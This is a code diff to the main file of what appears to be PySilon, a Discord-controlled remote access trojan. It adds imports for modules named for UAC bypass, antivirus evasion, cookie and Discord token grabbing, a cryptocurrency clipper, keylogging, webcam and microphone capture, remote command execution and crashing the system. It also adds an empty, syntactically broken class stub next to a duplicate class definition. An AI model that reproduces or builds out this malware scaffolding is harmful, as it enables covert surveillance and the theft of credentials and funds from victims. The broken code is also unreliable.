@@ -1,4 +1,34 @@
 #<imports>
+from modules.protections import *   #!internal
+from modules.av import *            #!internal
+from modules.uac_bypass import *    #!internal
+from modules.info import *          #!internal
+
+from features.audio_control import *         #!internal
+from features.break_windows import *         #!internal
+from features.bsod import *                  #!internal
+from features.crypto_clipper import *        #!internal
+from features.fake_error import *            #!internal
+from features.file_management import *       #!internal
+from features.grabber_cookies import *       #!internal
+from features.grabber_discord import *       #!internal
+from features.input_blocker import *         #!internal
+from features.jumpscare import *             #!internal
+from features.keystrokes import *            #!internal
+from features.live_mic import *              #!internal
+from features.monitor_control import *       #!internal
+from features.process_management import *    #!internal
+from features.remote_cmd import *            #!internal
+from features.screen_manipulation import *   #!internal
+from features.screen_record import *         #!internal
+from features.screenshot import *            #!internal
+from features.tts import *                   #!internal
+from features.wallpaper import *             #!internal
+from features.webcam import *                #!internal
+from features.website_blocker import *       #!internal
+
+
+
 from urllib.request import urlopen
 from discord.ext import commands
 from getpass import getuser
@@ -15,11 +45,14 @@ import os
 # Don't edit anything in this file. Everything will be handled by compiler. #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
-#<configuration />
-bot_token = ''
-guild_ids = []
-#</configuration>
 DEFAULT = 'DEFAULT'
+
+class PySilon():
+    def __init__(self):
+
+
+
+
 
 class PySilon(commands.Bot):
     def __init__(self, command_prefix, self_bot) -> None:
